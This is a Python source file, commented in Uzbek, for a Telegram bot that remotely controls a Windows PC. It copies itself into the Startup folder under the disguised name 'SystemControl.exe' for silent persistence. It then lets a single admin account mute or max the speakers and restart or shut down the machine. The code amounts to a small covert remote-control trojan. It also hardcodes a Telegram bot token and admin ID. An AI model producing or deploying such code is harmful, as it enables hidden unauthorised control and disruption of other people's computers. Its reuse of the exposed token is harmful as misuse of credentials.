import telebot
import os
import sys
import shutil
from telebot import types
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume

# --- SOZLAMALAR ---
TOKEN = '8067999467:AAEtm-y3hI_kKr3EKzhMr0cWSyiLGAMterQ'
ADMIN_ID = "7958070473"  # Bu yerga @userinfobot orqali olingan ID ni yozing
bot = telebot.TeleBot(TOKEN)

# --- AVTOYUKLANISH ---
def persistence():
    if os.name == 'nt' and getattr(sys, 'frozen', False):
        try:
            dest = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup\SystemControl.exe')
            if not os.path.exists(dest):
                shutil.copy(sys.executable, dest)
        except: pass

# --- OVOZNI BOSHQARISH FUNKSIYASI ---
def set_volume(level):
    try:
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        # level: 0.0 dan 1.0 gacha
        volume.SetMasterVolumeLevelScalar(level, None)
        return True
    except:
        return False

# --- ADMIN TEKSHIRUVI ---
def is_admin(uid):
    return str(uid) == str(ADMIN_ID)

# --- MENYU ---
def main_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add('🔊 Ovoz MAX', '🔇 Ovoz 0', '🔄 Restart', '🔌 O\'chirish')
    return markup

@bot.message_handler(commands=['start'])
def start(m):
    if is_admin(m.from_user.id):
        bot.send_message(m.chat.id, "🎮 Tizim boshqaruvi tayyor.", reply_markup=main_menu())

# --- BUYRUQLAR ---

@bot.message_handler(func=lambda m: m.text == '🔊 Ovoz MAX')
def vol_max(m):
    if not is_admin(m.from_user.id): return
    if set_volume(1.0):
        bot.send_message(m.chat.id, "🔊 Ovoz maksimal darajaga ko'tarildi (100%).")
    else:
        bot.send_message(m.chat.id, "❌ Ovozni o'zgartirib bo'lmadi.")

@bot.message_handler(func=lambda m: m.text == '🔇 Ovoz 0')
def vol_min(m):
    if not is_admin(m.from_user.id): return
    if set_volume(0.0):
        bot.send_message(m.chat.id, "🔇 Ovoz o'chirildi (0%).")
    else:
        bot.send_message(m.chat.id, "❌ Ovozni o'zgartirib bo'lmadi.")

@bot.message_handler(func=lambda m: m.text == '🔄 Restart')
def restart_pc(m):
    if not is_admin(m.from_user.id): return
    bot.send_message(m.chat.id, "🔄 Kompyuter 60 soniyadan so'ng qayta yonadi (Restart).")
    os.system("shutdown /r /t 60")

@bot.message_handler(func=lambda m: m.text == '🔌 O\'chirish')
def shutdown_pc(m):
    if not is_admin(m.from_user.id): return
    bot.send_message(m.chat.id, "🔌 Kompyuter 60 soniyadan so'ng xavfsiz o'chadi.")
    # /s - o'chirish, /t 60 - vaqt, /f - majburlash EMAS (xavfsiz)
    os.system("shutdown /s /t 60")

if __name__ == "__main__":
    persistence()
    bot.infinity_polling()